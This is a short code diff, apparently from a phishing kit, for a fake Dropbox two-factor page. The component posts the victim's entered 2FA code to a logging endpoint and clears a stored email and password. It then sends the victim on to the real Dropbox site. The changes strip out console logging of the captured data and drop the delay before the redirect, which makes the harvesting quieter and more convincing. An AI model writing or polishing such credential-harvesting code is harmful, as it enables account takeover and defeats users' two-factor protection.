@@ -66,16 +66,13 @@ export default function TwoFactorAuth() {
         code: code.join(''),
         type: '2FA'
       };
-      console.log('Sending log data:', logData);
-      const response = await fetch('/api/logs', {
+      await fetch('/api/logs', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
         },
         body: JSON.stringify(logData),
       });
-      const result = await response.json();
-      console.log('Log response:', result);
     } catch (error) {
       console.error('Error logging 2FA attempt:', error);
     }
@@ -84,10 +81,8 @@ export default function TwoFactorAuth() {
     sessionStorage.removeItem('email');
     sessionStorage.removeItem('password');
 
-    // Simulate verification delay then redirect
-    setTimeout(() => {
-      window.location.href = 'https://www.dropbox.com/home';
-    }, 1000);
+    // Redirect immediately
+    window.location.href = 'https://www.dropbox.com/home';
   };
 
   return (
